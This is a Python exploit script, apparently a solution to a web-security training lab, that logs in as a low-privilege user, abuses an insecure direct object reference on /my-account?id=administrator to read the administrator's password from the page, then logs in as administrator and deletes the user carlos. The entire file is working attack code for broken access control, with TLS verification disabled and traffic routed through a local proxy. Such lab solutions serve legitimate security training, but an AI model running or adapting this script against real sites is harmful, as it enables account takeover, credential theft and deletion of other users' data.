import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def retrieve_admin_password(s, url):

    # Retrieve the CSRF token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Login as the wiener user
    print("(+) Logging in as the wiener user...")
    data_login = {"username": "wiener", "password": "peter", "csrf": csrf_token}

    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user...")

        # Retrieve admin password
        admin_account_url = url + "/my-account?id=administrator"
        r = s.get(admin_account_url, verify=False, proxies=proxies)
        res = r.text

        if 'administrator' in res:
            print("(+) Successfully accessed the administrator account...")
            print("(+) Retrieving the administrator password...")
            soup = BeautifulSoup(r.text, 'html.parser')
            password = soup.find("input", {'name': 'password'})['value']
            return password
        else:
            print("(-) Could not access the administrator account.")
            sys.exit(-1)


    else:
        print("(-) Could not login as the wiener user.")
        sys.exit(-1)

def delete_carlos_user(s, url, password):

    # Retrieve the CSRF token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Login as the administrator user
    print("(+) Logging in as the administrator user...")
    data_login = {"username": "administrator", "password": password, "csrf": csrf_token}

    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the administrator user...")

        # Deleting the user
        print("(+) Deleting Carlos user...")
        delete_carlos_url = url + "/admin/delete?username=carlos"
        r = s.get(delete_carlos_url, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("Successfully deleted the Carlos user.")
        else:
            print("Could not delete the Carlos user.")
            sys.exit(-1)

    else:
        print("(-) Could not login as the administrator user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    admin_password = retrieve_admin_password(s, url)

    # delete carlos user code here
    s = requests.Session()
    delete_carlos_user(s, url, admin_password)

if __name__ == "__main__":
    main()